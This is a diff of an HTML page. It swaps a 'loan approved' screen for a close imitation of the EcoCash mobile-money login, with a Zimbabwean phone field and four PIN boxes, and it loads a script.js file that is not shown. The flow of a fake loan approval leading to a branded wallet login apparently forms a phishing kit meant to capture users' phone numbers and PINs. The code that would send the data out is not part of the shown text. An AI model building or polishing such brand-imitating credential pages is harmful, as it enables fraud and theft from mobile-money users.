@@ -2,29 +2,150 @@
 <html>
 
 <head>
-    <title>Application Status</title>
+    <title>EcoCash Login</title>
+
+    <!-- MOBILE -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
     <link rel="stylesheet" href="style.css">
+
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: #1e63c6;
+        }
+
+        .top-section {
+            background: white;
+            padding: 30px 20px 80px;
+            border-bottom-left-radius: 60px;
+            border-bottom-right-radius: 60px;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .logo span {
+            color: red;
+        }
+
+        .login-title {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        .phone-box {
+            display: flex;
+            align-items: center;
+            border: 2px solid #1e63c6;
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 20px;
+        }
+
+        .flag {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        .phone-input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .pin-title {
+            margin-top: 25px;
+            font-size: 16px;
+        }
+
+        .pin-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .pin-box {
+            width: 50px;
+            height: 55px;
+            border: 2px solid #1e63c6;
+            border-radius: 10px;
+            font-size: 22px;
+            text-align: center;
+        }
+
+        .bottom-section {
+            background: #1e63c6;
+            padding: 40px 20px;
+            text-align: center;
+            color: white;
+        }
+
+        .bottom-text {
+            margin-bottom: 20px;
+        }
+
+        .actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .action-btn {
+            background: white;
+            color: black;
+            padding: 14px;
+            border-radius: 12px;
+            width: 45%;
+            border: none;
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="header"></div>
+<!-- TOP WHITE -->
+<div class="top-section">
 
-<div class="container">
+    <div class="logo">Eco<span>Cash</span></div>
 
-    <h2 class="title">Application Approved 🎉</h2>
+    <div class="login-title">Login</div>
 
-    <div class="summary">
-        <p>Your loan has been successfully approved.</p>
-        <p>Funds will be processed shortly.</p>
+    <!-- PHONE -->
+    <div class="phone-box">
+        <div class="flag">🇿🇼</div>
+        <input class="phone-input" value="+2637" id="phone">
     </div>
 
-    <button onclick="finish()">Finish</button>
+    <!-- PIN -->
+    <div class="pin-title">Enter your PIN</div>
+
+    <div class="pin-container">
+        <input class="pin-box" maxlength="1">
+        <input class="pin-box" maxlength="1">
+        <input class="pin-box" maxlength="1">
+        <input class="pin-box" maxlength="1">
+    </div>
 
 </div>
 
-<div class="footer"></div>
+<!-- BOTTOM BLUE -->
+<div class="bottom-section">
+
+    <div class="bottom-text">Don’t have an EcoCash Wallet?</div>
+
+    <div class="actions">
+        <button class="action-btn">Register</button>
+        <button class="action-btn">Help & Support</button>
+    </div>
+
+</div>
 
 <script src="script.js"></script>
 
